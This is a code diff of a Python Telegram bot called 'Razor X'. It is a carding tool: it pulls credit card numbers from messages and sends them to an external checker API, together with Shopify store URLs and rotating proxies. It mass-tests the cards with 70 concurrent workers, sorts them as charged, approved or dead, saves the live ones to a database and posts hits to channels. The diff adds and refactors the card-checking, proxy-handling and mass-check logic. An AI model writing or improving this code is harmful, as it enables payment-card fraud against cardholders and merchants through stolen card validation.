@@ -1,4 +1,4 @@
-# 𝙍𝘼𝙕𝙊𝙍 𝙓 𝘽ο𝙩
+# 𝙍𝘼𝙕𝙊𝙍 𝙓 𝘽𝙤𝙩
 from telethon.errors import FloodWaitError
 from telethon import TelegramClient, events, Button
 from telethon.tl.types import MessageEntityCustomEmoji, ChannelParticipantBanned
@@ -51,7 +51,7 @@ JOIN_CHANNEL_ID = int(os.getenv("JOIN_CHANNEL_ID", 0))
 JOIN_GROUP_LINK = os.getenv("JOIN_GROUP_LINK", "https://t.me/jonvhddrrd")
 JOIN_CHANNEL_LINK = os.getenv("JOIN_CHANNEL_LINK", "https://t.me/hgffrrddrddf")
 
-# --- الإعدادات الصحيحة للـ API والملفات ---
+# --- API ENDPOINTS ---
 CHECKER_API_URL = 'http://62.72.20.10:8081/'
 PROXY_FILE = 'proxy.txt'
 
@@ -59,7 +59,7 @@ PROXY_FILE = 'proxy.txt'
 GITHUB_SITES_URL = os.getenv("GITHUB_SITES_URL", "https://raw.githubusercontent.com/username/repo/main/sites.txt")
 
 SP_PER_USER_WORKERS = 30
-WORKERS = 70  # سرعة الفحص المتوازن لمنع تعليق السيرفر
+WORKERS = 70
 PROXY_PER_USER_WORKERS = 50
 BIN_WORKERS = 20
 
@@ -147,27 +147,6 @@ async def save_card_to_db(card, status, response, gateway, price):
                 await f.write(json.dumps(data, indent=4))
         except Exception: pass
 
-async def get_total_cards_count():
-    async with DB_LOCK_MAIN:
-        try:
-            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
-                return len(json.load(f).get("cards", []))
-        except: return 0
-
-async def get_charged_count():
-    async with DB_LOCK_MAIN:
-        try:
-            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
-                return sum(1 for c in json.load(f).get("cards", []) if c.get("status") == "CHARGED")
-        except: return 0
-
-async def get_approved_count():
-    async with DB_LOCK_MAIN:
-        try:
-            async with aiofiles.open("database.json", "r", encoding="utf-8") as f:
-                return sum(1 for c in json.load(f).get("cards", []) if c.get("status") == "APPROVED")
-        except: return 0
-
 # ====================== GITHUB SITES FETCHER ======================
 _CACHED_SITES = []
 _LAST_SITES_FETCH = 0
@@ -231,33 +210,21 @@ async def fetch_random_gif():
 
 ACTIVE_MTXT_PROCESSES = {}
 USER_APPROVED_PREF = {}
-MAINTENANCE_FILE = "maintenance.json"
 _FREE_SP_USAGE = {}
 _FREE_SP_LAST_USE = {}
 HIT_BUTTON = [[Button.url("Razor X", "https://t.me/Razor_x_1998_bot")]]
 BOT_START_TIME = time.time()
 
-# ====================== HTTP SESSIONS & SEMAPHORES ======================
+# ====================== HTTP SESSIONS ======================
 _USER_HTTP_SESSIONS = {}
-_USER_SEMS = {}
-
-def get_user_sem(uid, sem_type="msp"):
-    key = f"{uid}_{sem_type}"
-    if key not in _USER_SEMS:
-        limits = {"sp": 30, "msp": WORKERS, "proxy": 50}
-        _USER_SEMS[key] = asyncio.Semaphore(limits.get(sem_type, 30))
-    return _USER_SEMS[key]
-
-def cleanup_user_sem(uid):
-    for k in list(_USER_SEMS.keys()):
-        if k.startswith(f"{uid}_"): del _USER_SEMS[k]
+_BIN_SEM = asyncio.Semaphore(BIN_WORKERS)
 
 async def get_user_http_session(uid, purpose="general"):
     key = f"{uid}_{purpose}"
     session = _USER_HTTP_SESSIONS.get(key)
     if session is None or session.closed:
         connector = aiohttp.TCPConnector(limit=0, ssl=False, force_close=False)
-        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=API_TIMEOUT, connect=10), connector=connector)
+        session = aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=API_TIMEOUT), connector=connector)
         _USER_HTTP_SESSIONS[key] = session
     return session
 
@@ -268,7 +235,7 @@ async def cleanup_user_http_session(uid, purpose="general"):
         try: await session.close()
         except: pass
 
-# ====================== EXTRACTION & PARSING ======================
+# ====================== EXTRACTION ======================
 def extract_cc(text):
     if not text: return []
     cards = []
@@ -287,10 +254,9 @@ def parse_proxy_format(proxy):
     pm = re.match(r'^(socks5|socks4|http|https)://(.+)$', proxy, re.IGNORECASE)
     if pm: pt, proxy = pm.group(1).lower(), pm.group(2)
     h = p = u = pw = ''
-    m = re.match(r'^(?:[^@:]+):(?:[^@]+)@(?:[^:@]+):(?:\d+)$', proxy)
+    m = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
     if m:
-        m_parts = re.match(r'^([^@:]+):([^@]+)@([^:@]+):(\d+)$', proxy)
-        u, pw, h, p = m_parts.groups()
+        u, pw, h, p = m.groups()
     elif re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy):
         m2 = re.match(r'^([^:]+):(\d+):([^:]+):(.+)$', proxy)
         ph, pp, pu, ppw = m2.groups()
@@ -299,7 +265,12 @@ def parse_proxy_format(proxy):
         m3 = re.match(r'^([^:@]+):(\d+)$', proxy)
         h, p = m3.groups()
     else: return None
-    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': proxy}
+    if not h or not p: return None
+    try:
+        if not (0 < int(p) <= 65535): return None
+    except: return None
+    pu = f'{pt}://{u}:{pw}@{h}:{p}' if u and pw else f'{pt}://{h}:{p}'
+    return {'ip': h, 'port': p, 'username': u or None, 'password': pw or None, 'proxy_url': pu, 'type': pt}
 
 def get_file_lines(filepath):
     if not os.path.exists(filepath): return []
@@ -316,14 +287,9 @@ def get_txt_proxies():
     return proxies
 
 # ====================== API CHECKERS ======================
-async def test_proxy(proxy_url):
-    try:
-        timeout = aiohttp.ClientTimeout(total=PROXY_TIMEOUT)
-        async with aiohttp.ClientSession(timeout=timeout) as s:
-            async with s.get('http://api.ipify.org?format=json', proxy=proxy_url) as r:
-                if r.status == 200: return True, (await r.json()).get('ip', '?')
-                return False, None
-    except: return False, None
+def is_dead_site_error(error_msg):
+    if not error_msg: return True
+    return any(keyword in str(error_msg).lower() for keyword in _DEAD_INDICATORS)
 
 async def get_bin_info(cn):
     try:
@@ -345,57 +311,53 @@ async def check_card_api(card, site, proxy, session):
     try:
         parts = card.split('|')
         if len(parts) != 4:
-            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card}
+            return {'status': 'Invalid Format', 'message': 'Invalid card format', 'card': card, 'proxy': proxy}
 
-        # 🚀 الفلترة الاحترافية: صياغة البروكسي بالشكل الذي يقبله سيرفرك دون أي بادئة وهمية تسبب تايماوت
         params = {'cc': card, 'url': site}
-        if proxy and isinstance(proxy, dict):
-            if proxy.get('username') and proxy.get('password'):
-                params['proxy'] = f"{proxy['username']}:{proxy['password']}@{proxy['ip']}:{proxy['port']}"
-            else:
-                params['proxy'] = f"{proxy['ip']}:{proxy['port']}"
-        elif proxy and isinstance(proxy, str) and proxy.strip() != "":
+        if proxy and str(proxy).strip() != "":
             params['proxy'] = proxy.strip()
         
         async with session.get(CHECKER_API_URL, params=params) as resp:
             text_data = await resp.text()
             if resp.status != 200:
-                return {'status': 'Site Error', 'message': f'HTTP {resp.status}', 'card': card, 'retry': True}
-            try: rj = json.loads(text_data)
-            except: return {'status': 'Site Error', 'message': 'JSON Format Error', 'card': card, 'retry': True}
+                return {'status': 'Site Error', 'message': f'HTTP Error {resp.status}', 'card': card, 'retry': True, 'gateway': '-', 'price': '-', 'proxy': proxy}
+            try:
+                raw = json.loads(text_data)
+            except:
+                return {'status': 'Site Error', 'message': 'Invalid API Response', 'card': card, 'retry': True, 'gateway': '-', 'price': '-', 'proxy': proxy}
 
-        response_msg = rj.get('Response', '')
-        price = rj.get('Price', '-')
-        gate = rj.get('Gate', 'Shopify')
-        status = rj.get('Status', '')
+        response_msg = raw.get('Response', '')
+        price = raw.get('Price', '-')
+        gate = raw.get('Gate', 'Shopify')
+        status = raw.get('Status', '')
 
         if is_dead_site_error(response_msg):
-            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
+            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'proxy': proxy}
 
         response_lower = str(response_msg).lower()
 
         if status == 'Charged' or 'order completed' in response_lower or '💎' in response_msg:
-            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
         elif 'cloudflare bypass failed' in response_lower:
-            return {'status': 'Site Error', 'message': 'Cloudflare bypass failed', 'card': card, 'retry': True, 'gateway': gate, 'price': price}
+            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'proxy': proxy}
         elif 'thank you' in response_lower or 'payment successful' in response_lower:
-            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
         elif status == 'Approved' or any(key in response_lower for key in [
             'approved', 'success', 'insufficient_funds', 'insufficient funds',
             'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
             'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
             'incorrect_zip', 'incorrect zip'
         ]):
-            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
         else:
             if any(k in response_lower for k in ['proxy', 'timeout', 'error', 'session', 'failed']):
-                return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}
-            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
+                return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price, 'proxy': proxy}
+            return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price, 'proxy': proxy}
 
     except asyncio.TimeoutError:
-        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True}
+        return {'status': 'Site Error', 'message': 'API Timeout', 'card': card, 'retry': True, 'proxy': proxy}
     except Exception:
-        return {'status': 'Site Error', 'message': 'Connection Interrupted', 'card': card, 'retry': True}
+        return {'status': 'Site Error', 'message': 'Connection Error', 'card': card, 'retry': True, 'proxy': proxy}
 
 async def check_card_with_retry(card, sites, proxies, session, max_retries=3):
     last_result = None
@@ -414,7 +376,7 @@ async def check_card_with_retry(card, sites, proxies, session, max_retries=3):
         last_result = result
         msg_lower = str(result.get('message', '')).lower()
 
-        if proxy and isinstance(proxy, dict) and any(x in msg_lower for x in ['proxy dead', 'proxy error', 'timeout', 'bad proxy', 'connection timeout']):
+        if proxy and any(x in msg_lower for x in ['proxy dead', 'proxy error', 'timeout', 'bad proxy', 'connection timeout']):
             if proxy in available_proxies: available_proxies.remove(proxy)
 
         if attempt < max_retries - 1:
@@ -425,6 +387,25 @@ async def check_card_with_retry(card, sites, proxies, session, max_retries=3):
     return {'status': 'Dead', 'message': 'Max retries exceeded', 'card': card, 'gateway': 'Shopify', 'price': '-'}
 
 # ====================== UI / MESSAGES ======================
+def build_entities(html_text, emoji_ids=None):
+    try:
+        text, entities = thtml.parse(html_text)
+        if emoji_ids:
+            idx, utf16_pos = 0, 0
+            for ch in text:
+                if ch == PE and idx < len(emoji_ids):
+                    entities.append(MessageEntityCustomEmoji(offset=utf16_pos, length=1, document_id=emoji_ids[idx]))
+                    idx += 1
+                utf16_pos += 2 if ord(ch) > 0xFFFF else 1
+        return text, sorted(entities, key=lambda e: e.offset)
+    except: return html_text, []
+
+# دالة صنع الأزرار الشفافة
+def pbtn(text, data=None, url=None):
+    if url: return Button.url(text, url)
+    if data: return Button.inline(text, data.encode() if isinstance(data, str) else data)
+    return Button.inline(text, b"none")
+
 async def styled_reply(event, html_text, buttons=None, emoji_ids=None, file=None):
     try:
         text, entities = build_entities(html_text, emoji_ids)
@@ -466,10 +447,10 @@ def format_card_result(status, card, gateway, response, price="-", bin_info=None
 
     return f"""{header}
 ━━━━━━━━━━━━━━━━━
-💳 <b>Card:</b> <code>{card}</code>
+<blockquote>💳 <b>Card:</b> <code>{card}</code>
 💬 <b>Response:</b> <code>{response}</code>
 🌐 <b>Gateway:</b> <code>{gateway}</code>
-💲 <b>Price:</b> <code>{ps}</code>
+💲 <b>Price:</b> <code>{ps}</code></blockquote>
 ━━━━━━━━━━━━━━━━━
 🏦 <b>Bank:</b> <code>{bi.get('bank', '-')}</code>
 🌍 <b>Country:</b> <code>{bi.get('country', '-')} {bi.get('flag', '🏳️')}</code>
@@ -547,22 +528,13 @@ async def _check_free_limits(event, uid, plan, is_group):
             return False
     return True
 
-def _get_card_from_event(event, reply_msg):
-    card = None
-    if reply_msg and reply_msg.text:
-        cc = extract_cc(reply_msg.text)
-        if cc: card = cc[0]
-    if not card:
-        cc = extract_cc(event.message.text)
-        if cc: card = cc[0]
-    return card
-
-# ====================== COMMANDS ======================
+# ====================== COMMANDS (USER) ======================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.](start|cmds?|commands?)$'))
 async def start(event):
     try:
         await ensure_user(event.sender_id)
         if not await force_join_check(event): return
+        
         uid = event.sender_id
         is_allowed, at = await can_use(uid, event.chat)
         if at == "banned":
@@ -657,6 +629,7 @@ async def info_cmd(event):
         limit_text = f"<code>{get_cc_limit(plan, event.sender_id)}</code>" if is_paid_plan(plan) else f"<code>{FREE_SP_DAILY_LIMIT}/day (group)</code>"
         used_today = get_free_sp_usage(event.sender_id)
         usage_line = f"\n{PE} <b>Used Today:</b> <code>{used_today}/{FREE_SP_DAILY_LIMIT}</code>" if not is_paid_plan(plan) and event.sender_id not in ADMIN_ID else ""
+        
         await styled_reply(event, f"""{PE} <b>Profile</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>ID:</b> <code>{event.sender_id}</code>\n{PE} <b>Status:</b> <code>{status}</code>\n{PE} <b>Plan:</b> {plan_emoji} <b>{plan.upper()}</b>\n{PE} <b>Expiry:</b> <code>{exp_str}</code>\n{PE} <b>Limit:</b> {limit_text}{usage_line}\n{PE} <b>Proxies:</b> <code>{pc}/100</code>""", emoji_ids=[CE["fire"], CE["fire"], CE["info"], CE["star"], CE["crown"], CE["chart"], CE["shield"]])
     except Exception as e: await event.reply(f"⚠️ Error in /info: {e}")
 
@@ -742,21 +715,6 @@ async def remove_proxy_cmd(event):
         except: await styled_reply(event, f"{PE} <b>Invalid</b>", emoji_ids=[CE["cross"]])
     except Exception as e: await event.reply(f"⚠️ Error in /rmpxy: {e}")
 
-@client.on(events.NewMessage(pattern=r'(?i)^[/.]chkpxy$'))
-async def check_proxies_cmd(event):
-    try:
-        if not await force_join_check(event): return
-        if event.is_group: return await styled_reply(event, f"{PE} <b>Private only</b>", emoji_ids=[CE["stop"]])
-        plan = await get_user_plan(event.sender_id)
-        if event.sender_id not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
-        proxies = await get_all_user_proxies(event.sender_id)
-        if not proxies: return await styled_reply(event, f"{PE} <b>No proxies</b>", emoji_ids=[CE["cross"]])
-        sm = await styled_reply(event, f"{PE} <b>Testing {len(proxies)}...</b>", emoji_ids=[CE["shield"]])
-        results = await asyncio.gather(*[test_proxy(p['proxy_url']) for p in proxies], return_exceptions=True)
-        w = sum(1 for r in results if isinstance(r, tuple) and r[0])
-        await styled_edit(sm, f"{PE} <b>Proxy Check</b>\n✅ Working: {w}\n❌ Dead: {len(results)-w}", emoji_ids=[CE["shield"]])
-    except Exception as e: await event.reply(f"⚠️ Error in /chkpxy: {e}")
-
 # ====================== SINGLE CHECK (/sp) ======================
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
 async def single_cc_check(event):
@@ -785,7 +743,8 @@ async def single_cc_check(event):
                 proxies = await get_all_user_proxies(aid)
                 if proxies: break
 
-        proxies = [p for p in proxies if p]
+        proxies.extend(get_txt_proxies())
+        proxies = [p['proxy_url'] for p in proxies if p]
 
         rm = await event.get_reply_message() if event.reply_to_msg_id else None
         
@@ -803,10 +762,9 @@ async def single_cc_check(event):
         st = time.time()
         try:
             session = await get_user_http_session(uid, "sp")
-            async with get_user_sem(uid, "sp"):
-                bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
-                result = await check_card_with_retry(card, sites, proxies=proxies, session=session, max_retries=3)
-                bi = await bin_task
+            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
+            result = await check_card_with_retry(card, sites, proxies=proxies, session=session, max_retries=3)
+            bi = await bin_task
                 
             elapsed = round(time.time() - st, 2)
             status = result.get('status', 'Dead')
@@ -818,7 +776,6 @@ async def single_cc_check(event):
             
             gif_io = await fetch_random_gif() if status in ["Charged", "Approved"] else None
             sent = False
-            
             if gif_io:
                 try:
                     await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON, file=gif_io)
@@ -839,126 +796,70 @@ async def single_cc_check(event):
     except Exception as e: await event.reply(f"⚠️ Error in /sp: {e}")
 
 # ====================== MASS CHECK (/msp) ======================
-async def _run_mass_process(event, cards, send_approved, process_store, stop_prefix, gate_name, sem_type):
+@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop$'))
+async def stop_cmd(event):
     uid = event.sender_id
-    try: sender = await event.get_sender(); username, name = sender.username or f"user_{uid}", sender.first_name or "User"
-    except: username, name = f"user_{uid}", "User"
-    
-    total = len(cards); checked = charged = approved = declined = errors = 0
-    mode = "C+A" if send_approved else "C only"
-    st = time.time(); hits = []
-    
-    sites = await get_github_sites()
-    proxies = await get_all_user_proxies(uid)
-    proxies = [p for p in proxies if p]
+    if uid in ACTIVE_MTXT_PROCESSES:
+        ACTIVE_MTXT_PROCESSES[uid]["stopped"] = True
+        for t in ACTIVE_MTXT_PROCESSES[uid].get("tasks", []):
+            if not t.done(): t.cancel()
+        await styled_reply(event, f"{PE} <b>Stopping...</b>", emoji_ids=[CE["stop"]])
+    else:
+        await styled_reply(event, f"{PE} <b>No active session</b>", emoji_ids=[CE["warn"]])
 
-    user_sem = get_user_sem(uid, sem_type)
-    http_session = await get_user_http_session(uid, sem_type)
-    
-    sm = await styled_reply(event, f"<pre>{PE} Processing ━ {mode} ━ {gate_name} ━ {WORKERS}w</pre>", emoji_ids=[CE["chart"]])
-    lcd = lrd = "-"
-    
-    def is_stopped():
-        proc = process_store.get(uid)
-        if not proc: return True
-        return proc.get("stopped", False) if isinstance(proc, dict) else False
-
-    # 🚀 لوحة التحكم المحدثة بشكل منفصل وسلس تمنع التعليق والـ API Timeout
-    async def dashboard_updater():
-        while not is_stopped():
-            await asyncio.sleep(2)
-            if is_stopped(): break
-            kb = [
-                [pbtn(f"💳 {lcd}", "none")],
-                [pbtn(f"✅ Charged: {charged}", "none"), pbtn(f"⚡ Approved: {approved}", "none")],
-                [pbtn(f"❌ Declined: {declined}", "none"), pbtn(f"⚠️ Errors: {errors}", "none")],
-                [pbtn(f"📊 Checked: {checked} / {total}", "none")],
-                [pbtn("🛑 Stop Check", f"{stop_prefix}:{uid}")]
-            ]
-            try: await styled_edit(sm, f"<pre>{PE} Processing...</pre>", buttons=kb, emoji_ids=[CE["star"]])
+async def _send_mass_hit(card, status, message, price, gateway, uid, username, name):
+    await asyncio.sleep(HIT_DELAY)
+    try:
+        bi = await get_bin_info(card.split("|")[0])
+        msg, eid = format_card_result(status, card, gateway, message[:150], price, bi, 0.0)
+        
+        gif_io = await fetch_random_gif() if status in ["Charged", "Approved"] else None
+        sent = False
+        if gif_io:
+            try:
+                await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON, file=gif_io)
+                sent = True
             except: pass
             
-    updater_task = asyncio.create_task(dashboard_updater())
-    all_results = {'charged': [], 'approved': [], 'dead': [], 'error': []}
-    queue = asyncio.Queue()
-    for c in cards: queue.put_nowait(c)
-
-    async def worker(worker_id):
-        nonlocal checked, charged, approved, declined, errors, lcd, lrd
-        # توزيع انطلاق العمال تدريجياً لعدم خنق السيرفر وإعطاء تايماوت
-        await asyncio.sleep(worker_id * 0.05)
-        
-        while not queue.empty() and not is_stopped():
-            try: card = queue.get_nowait()
-            except asyncio.QueueEmpty: break
+        if not sent:
+            await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
             
-            try:
-                async with user_sem:
-                    res = await check_card_with_retry(card, sites, proxies, http_session, max_retries=3)
-                    
-                status = res.get('status', 'Dead')
-                message = res.get('message', 'Error')
-                gateway = res.get('gateway', 'Shopify')
-                price = res.get('price', '-')
-                
-                checked += 1
-                lcd = card
-                lrd = message[:30]
-                
-                if status == 'Charged':
-                    charged += 1
-                    all_results['charged'].append(res)
-                    asyncio.create_task(save_card_to_db(card, "CHARGED", message, gateway, price))
-                    asyncio.create_task(_send_mass_hit(card, "Charged", message, price, gateway, uid, username, name))
-                elif status == 'Approved':
-                    approved += 1
-                    all_results['approved'].append(res)
-                    asyncio.create_task(save_card_to_db(card, "APPROVED", message, gateway, price))
-                    if send_approved:
-                        asyncio.create_task(_send_mass_hit(card, "Approved", message, price, gateway, uid, username, name))
-                elif status == 'Site Error':
-                    errors += 1
-                    all_results['error'].append(res)
-                else:
-                    declined += 1
-                    all_results['dead'].append(res)
-                    
-                queue.task_done()
-            except Exception as e:
-                queue.task_done()
-                errors += 1
-                checked += 1
-                all_results['error'].append({'card': card, 'message': str(e), 'gateway': 'Shopify', 'price': '-'})
+        if status in ["Charged", "Approved"]:
+            res_dict = {"card": card, "message": message, "price": price}
+            asyncio.create_task(send_channel_hit(res_dict, uid, username, name, gateway, status))
+    except: pass
 
-    workers_tasks = [asyncio.create_task(worker(i)) for i in range(WORKERS)]
-    process_store[uid]["tasks"] = workers_tasks
-    
-    await asyncio.gather(*workers_tasks, return_exceptions=True)
-    updater_task.cancel()
-    
-    el = int(time.time() - st); h, m, s = el // 3600, (el % 3600) // 60, el % 60
-    stop_label = " (Stopped)" if is_stopped() else ""
-    
-    ft = f"""{PE} <b>Complete{stop_label}</b> {PE}
+async def send_final_results(uid, total, charged, approved, declined, errors, all_results):
+    summary = f"""✨ <b>Results Complete</b> ✨
 ━━━━━━━━━━━━━━━━━
-{PE} <b>Charged</b> ━ <code>{charged}</code>
-{PE} <b>Approved</b> ━ <code>{approved}</code>
-{PE} <b>Declined</b> ━ <code>{declined}</code>
-{PE} <b>Errors</b> ━ <code>{errors}</code>
-━━━━━━━━━━━━━━━━━
-{PE} <b>Checked</b> ━ <code>{checked}/{total}</code>"""
+💳 Total: {total} | ✅ Charged: {charged} | ⚡ Live: {approved} | ❌ Dead/Error: {declined + errors}
+━━━━━━━━━━━━━━━━━"""
+    filename = f"shopiii_{uid}_{int(time.time())}.txt"
+    try:
+        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
+            await f.write("=" * 70 + "\n✨ CC CHECKER RESULTS ✨\nFormat: CC | Gateway | Price | Message\n" + "=" * 70 + "\n\n")
+            
+            await f.write(f"✅ CHARGED ({len(all_results['charged'])}):\n" + "-" * 70 + "\n")
+            for r in all_results['charged']: 
+                await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {str(r['message'])[:100]}\n")
+            
+            await f.write(f"\n⚡ APPROVED ({len(all_results['approved'])}):\n" + "-" * 70 + "\n")
+            for r in all_results['approved']: 
+                await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {str(r['message'])[:100]}\n")
+            
+            await f.write(f"\n❌ DEAD ({len(all_results['dead'])}):\n" + "-" * 70 + "\n")
+            for r in all_results['dead']: 
+                await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {str(r['message'])[:100]}\n")
+                
+            await f.write(f"\n⚠️ ERRORS ({len(all_results['error'])}):\n" + "-" * 70 + "\n")
+            for r in all_results['error']: 
+                await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {str(r['message'])[:100]}\n")
 
-    fkb = [
-        [pbtn(f"✅ Charged: {charged}", "none"), pbtn(f"⚡ Approved: {approved}", "none")],
-        [pbtn(f"📊 Total: {checked}/{total}", "none"), pbtn(f"⏱ {h}h {m}m {s}s", "none")]
-    ]
-    for _ in range(3):
-        try: await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"], CE["declined"], CE["warn"], CE["star"]]); break
-        except: await asyncio.sleep(0.5)
-        
-    await send_final_results(uid, total, charged, approved, declined, errors, all_results)
-    process_store.pop(uid, None)
-    await cleanup_user_http_session(uid, sem_type); cleanup_user_sem(uid)
+        await styled_send(uid, summary, file=filename)
+    except: pass
+    finally:
+        try: os.remove(filename)
+        except: pass
 
 @client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
 async def mass_check_cmd(event):
@@ -990,30 +891,121 @@ async def mass_check_cmd(event):
             if len(parts) > 1: content = parts[1]
             else: return await styled_reply(event, f"{PE} <b>Reply to .txt or paste cards after </b><code>/msp</code>", emoji_ids=[CE["info"]])
         
+        sites = await get_github_sites()
+        if not sites: return await styled_reply(event, f"{PE} <b>No sites available from GitHub!</b>", emoji_ids=[CE["warn"]])
+        
+        proxies = await get_all_user_proxies(uid)
+        proxies.extend(get_txt_proxies())
+        proxies = [p['proxy_url'] for p in proxies if p]
+
         cards = extract_cc(content)
         if not cards: return await styled_reply(event, f"{PE} <b>No valid cards</b>", emoji_ids=[CE["cross"]])
         if len(cards) > cl: cards = cards[:cl]
         
-        kb = [[pbtn("Charged + Approved", f"chk_pref:yes:{uid}")], [pbtn("Only Charged", f"chk_pref:no:{uid}")]]
-        pm = await styled_reply(event, f"{PE} <b>Filter</b>", kb, emoji_ids=[CE["chart"]])
-        USER_APPROVED_PREF[f"chk_{uid}"] = {"cards": cards, "event": event, "pref_msg": pm}
-    except Exception as e: await event.reply(f"⚠️ Error in /msp: {e}")
+        sm = await styled_reply(event, f"<pre>{PE} Starting mass check: {len(cards)} CCs</pre>", emoji_ids=[CE["star"]])
+        
+        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
+        
+        try: sender = await event.get_sender(); username, name = sender.username or f"user_{uid}", sender.first_name or "User"
+        except: username, name = f"user_{uid}", "User"
 
-@client.on(events.CallbackQuery(pattern=rb"chk_pref:(yes|no):(\d+)"))
-async def chk_pref_cb(event):
-    pref = event.pattern_match.group(1).decode()
-    uid = int(event.pattern_match.group(2).decode())
-    if event.sender_id != uid: return await event.answer("Not yours!", alert=True)
-    data = USER_APPROVED_PREF.pop(f"chk_{uid}", None)
-    if not data: return await event.answer("Expired!", alert=True)
-    try: await data["pref_msg"].delete()
-    except: pass
-    if uid in ACTIVE_MTXT_PROCESSES: return await event.answer("Already running!", alert=True)
-    
-    ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
-    await event.answer("Starting...")
-    
-    asyncio.create_task(_run_mass_process(data["event"], data["cards"], pref == "yes", ACTIVE_MTXT_PROCESSES, "stop_chk", "Shopify", "msp"))
+        all_results = {'charged': [], 'approved': [], 'dead': [], 'error': []}
+        checked = charged = approved = declined = errors = 0
+        total = len(cards)
+        st = time.time()
+        lcd = lrd = "-"
+        last_ui = 0
+        
+        session = await get_user_http_session(uid, "msp")
+        queue = asyncio.Queue()
+        for c in cards: queue.put_nowait(c)
+        
+        async def worker():
+            nonlocal checked, charged, approved, declined, errors, lcd, lrd, last_ui
+            while not queue.empty() and not ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True):
+                try: card = queue.get_nowait()
+                except asyncio.QueueEmpty: break
+                
+                try:
+                    res = await check_card_with_retry(card, sites, proxies, session, max_retries=3)
+                    status = res.get('status', 'Dead')
+                    message = res.get('message', 'Error')
+                    gateway = res.get('gateway', 'Shopify')
+                    price = res.get('price', '-')
+                    
+                    checked += 1
+                    lcd = card
+                    lrd = message[:30]
+                    
+                    if status == 'Charged':
+                        charged += 1
+                        all_results['charged'].append(res)
+                        asyncio.create_task(save_card_to_db(card, "CHARGED", message, gateway, price))
+                        asyncio.create_task(_send_mass_hit(card, "Charged", message, price, gateway, uid, username, name))
+                    elif status == 'Approved':
+                        approved += 1
+                        all_results['approved'].append(res)
+                        asyncio.create_task(save_card_to_db(card, "APPROVED", message, gateway, price))
+                        asyncio.create_task(_send_mass_hit(card, "Approved", message, price, gateway, uid, username, name))
+                    elif status == 'Site Error':
+                        errors += 1
+                        all_results['error'].append(res)
+                    else:
+                        declined += 1
+                        all_results['dead'].append(res)
+                        
+                    queue.task_done()
+                    
+                    now = time.time()
+                    if now - last_ui > 3.0:
+                        last_ui = now
+                        kb = [
+                            [pbtn(f"💳 {lcd}", "none")],
+                            [pbtn(f"✅ Charged: {charged}", "none"), pbtn(f"⚡ Approved: {approved}", "none")],
+                            [pbtn(f"❌ Declined: {declined}", "none"), pbtn(f"⚠️ Errors: {errors}", "none")],
+                            [pbtn(f"📊 Checked: {checked} / {total}", "none")],
+                            [pbtn("🛑 Stop Check", f"stop_chk:{uid}")]
+                        ]
+                        try: await styled_edit(sm, f"<pre>{PE} Processing...</pre>", buttons=kb, emoji_ids=[CE["star"]])
+                        except: pass
+                        
+                except Exception as e:
+                    queue.task_done()
+                    errors += 1
+                    checked += 1
+                    all_results['error'].append({'card': card, 'message': str(e), 'gateway': 'Shopify', 'price': '-'})
+        
+        workers = [asyncio.create_task(worker()) for _ in range(WORKERS)]
+        ACTIVE_MTXT_PROCESSES[uid]["tasks"] = workers
+        
+        await asyncio.gather(*workers, return_exceptions=True)
+        
+        el = int(time.time() - st); h, m, s = el // 3600, (el % 3600) // 60, el % 60
